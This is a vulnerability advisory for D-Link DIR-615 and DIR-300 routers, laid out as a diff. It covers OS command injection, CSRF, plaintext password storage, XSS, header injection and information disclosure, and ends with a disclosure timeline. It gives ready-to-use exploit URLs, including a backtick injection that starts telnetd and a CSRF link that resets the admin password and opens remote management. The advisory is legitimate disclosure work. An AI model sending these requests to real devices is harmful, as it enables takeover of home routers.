@@ -1,0 +1,138 @@
+Device Name: DIR-615 - Hardware revision D3 / DIR-300 - Hardware revision A
+Vendor: D-Link
+
+============ Device Description: ============
+
+DIR-300: http://www.dlink.com/de/de/home-solutions/connect/routers/dir-300-wirele...
+DIR-615: http://www.dlink.com/de/de/support/product/dir-615-wireless-n-300-router...
+
+============ Vulnerable Firmware Releases - DIR-615: ============
+
+Tested Firmware Version : 4.13
+
+============ Vulnerable Firmware Releases - DIR-300: ============
+
+Firmware Version : 1.05 , Fri 13 Feb 2009
+Firmware Version : 1.05 , Mon 06 Jul 2009
+Firmware Version : 1.05 , Fri 26 Nov 2010
+
+I like the same version number with different build dates :-D
+
+============ Vulnerability Overview: ============
+
+    * OS Command Injection (1) 
+
+The vulnerability is caused by missing input validation in the set/runtime/diagnostic/pingIp and the exeshell parameter and can be exploited to inject and execute arbitrary shell commands.
+It is possible to start a telnetd to compromise the device. You need credentials for the webinterface.
+
+http://192.168.178.155/tools_system.xgi?random_num=2012.8.24.13.34.33&exeshell=submit%20`ping 192.168.178.102`
+
+Screenshot: http://www.s3cur1ty.de/sites/www.s3cur1ty.de/files/images/DIR-300_A-code-execution.png
+
+http://192.168.178.155/tools_vct.xgi?set/runtime/switch/getlinktype=1&set/runtime/diagnostic/pingIp=1.1.1.1`telnetd`&pingIP=1.1.1.1
+
+Screenshot: http://www.s3cur1ty.de/sites/www.s3cur1ty.de/files/images/DIR-615_D-OS-Command-Injection-start-telnetd.png
+
+    * For changing the current password there is no request to the current password (2) 
+
+With this vulnerability an attacker is able to change the current password without knowing it. The attacker needs access to an authenticated browser.
+
+    CSRF for changing the password without knowing the current one and the attacker is able to activate the remote management (3): 
+
+http://Target-IP/tools_admin.php?ACTION_POST=1&apply=Save+Settings&admin_name=admin&admin_password1=admin1&admin_password2=admin1&grap_auth_enable_h=0&rt_enable=on&rt_enable_h=1&rt_ipaddr=0.0.0.0&rt_port=8080
+
+    * Insecure Cryptographic Storage (4): 
+
+There is no password hashing implemented and so it is saved in plain text on the system. You will find other ways to get access to it.
+
+# cat var/etc/httpasswd
+admin:admin
+
+    * reflected XSS (5) 
+
+Injecting scripts into the parameter send_mail reveals that this parameter is not properly validated for malicious input.
+
+http://192.168.178.150/tools_log_setting.php?ACTION_POST=SOMETHING&send_mail=--%3E%3Cscript%3Ealert%28%27XSSed%27%29%3C/script%3E&apply=Save+Settings&log_sys=1&log_dbg=1&log_att=1&log_drp=1&log_ntc=1&email_addr=&subject=&sender=&srv=&srv_port=25
+
+Screenshot: http://www.s3cur1ty.de/sites/www.s3cur1ty.de/files/images/DIR-300_A-XSSed.png
+
+    * HTTP Header Injection (6) 
+
+Injecting scripts into the parameter date reveals that this parameter is not properly validated for malicious input.
+
+Request:
+GET /tools_vct.xgi?%0dNew%20Header=1 HTTP/1.1
+Host: 192.168.178.155
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+
+Response:
+HTTP/1.1 302 Found
+Server: Alpha_webserv
+Date: Sat, 01 Jan 2000 08:26:28 GMT
+Content-Type: text/html
+Accept-Ranges: bytes
+Location: tools_vct.php?uptime=1589&
+New Header=1
+X-Pad: avoid browser bug
+Content-Length: 0
+
+    * Information Disclosure (7): 
+
+Detailed device information including Model Name, Hardware Version, Linux Kernel, Firmware version, Language and MAC Addresses are available unauthenticated via the network.
+
+Request:
+http://<IP>/DevInfo.txt
+
+Response:
+Firmware External Version: V4.13 Firmware Internal Version: ac6b Model Name: DIR-615 Hardware Version: D1 WLAN Domain: EU Kernel: Linux version 2.6.21 Language: en Graphcal Authentication: Disable LAN MAC: xxx WAN MAC: xxx WLAN MAC: xxx
+
+    * Information Disclosure (8): 
+
+Nice server banner to detect this type of devices easily:
+
+Server Banner: Mathopd/1.5p6
+
+============ Solution ============
+
+DIR-300A: Update to Firmware Version : 1.06 , Thu 11 Apr 2013
+DIR-615D: Update to Firmware Version : 4.14b02
+
+Vulnerability Nr. 1, 2, 3, 5, 6, 7, 8 - unfixed
+Vulnarability Nr. 4 - unknown
+
+Telnetd with hard coded credentials is disabled with this update.
+
+============ Credits ============
+
+The vulnerability was discovered by Michael Messner
+Mail: devnull#at#s3cur1ty#dot#de
+Web: http://www.s3cur1ty.de
+Advisory URL: http://www.s3cur1ty.de/m1adv2013-014
+Twitter: @s3cur1ty_de
+
+There is also a default telnet user available and documented here:
+http://www.dd-wrt.com/phpBB2/viewtopic.php?t=62146
+
+============ Time Line: ============
+
+October 2012 - discovered vulnerability
+15.10.2012 - contacted dlink via mail
+23.10.2012 - contacted dlink via first Webinterface
+11.11.2012 - contacted dlink via second Webinterface
+20.12.2012 - contacted Heise Security with details and Heisec forwarded the details to D-Link
+21.12.2012 - D-link responded that they will check the findings *h00ray*
+11.01.2013 - requested status update
+25.01.2013 - requested status update
+25.01.2013 - D-Link responded that this is a security problem from the user and/or browser and they will not provide a fix
+07.02.2013 - after the DIR-600/300 drama D'Link contacted me and now they would talk ;)
+- since 07.02. there is some communication between dlink and me
+18.04.2013 - a new beta image is available for testing
+20.04.2013 - tested the provided image, feedback to vendor
+22.04.2013 - vendor releases update
+22.04.2013 - public release
+
+===================== Advisory end =====================
